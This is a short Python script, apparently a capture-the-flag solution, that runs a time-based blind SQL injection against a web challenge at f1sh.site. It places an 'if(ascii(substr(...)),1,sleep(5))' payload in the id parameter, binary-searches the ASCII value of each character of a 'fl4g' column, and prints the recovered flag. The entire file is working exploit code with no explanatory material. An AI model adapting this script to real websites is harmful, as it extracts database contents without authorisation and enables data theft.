import urllib.request
import requests
import time


headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
}


def get_response(i, a_):
    url = 'http://f1sh.site/web/web7/index.php?id=1%20and%20if(%20ascii(substr((select%20fl4g%20from%20web7.flag%20limit%200,1),{},1))%3E{},1,sleep(5))%20%23'.format(i, a_)
    # return urllib.request.urlopen(url).read()
    return requests.get(url, headers=headers).content


def main():
    print(time.ctime())
    for i in range(1, 32):
        min_ = 0
        max_ = 128
        a = min_
        for j in range(64):
            a_ = a
            result = get_response(i, a_)
            if result == b'<h1>Hello,world!</h1><br>Hello,world!':
                min_ = a
                a = (min_ + max_) // 2
            else:
                max_ = a
                a = (min_ + max_) // 2
            if a_ == a:
                result = get_response(i, a_ + 1)
                if result != b'<h1>Hello,world!</h1><br>Hello,world!':
                    print(chr(a_ + 1), end='')
                else:
                    print(chr(a_), end='')
                break
    print(time.ctime())

        # url = 'https://www.so.com/'
        # a = urllib.request.urlopen(url).read()
        # print(a.decode('utf-8'))

if __name__ == '__main__':
    main()
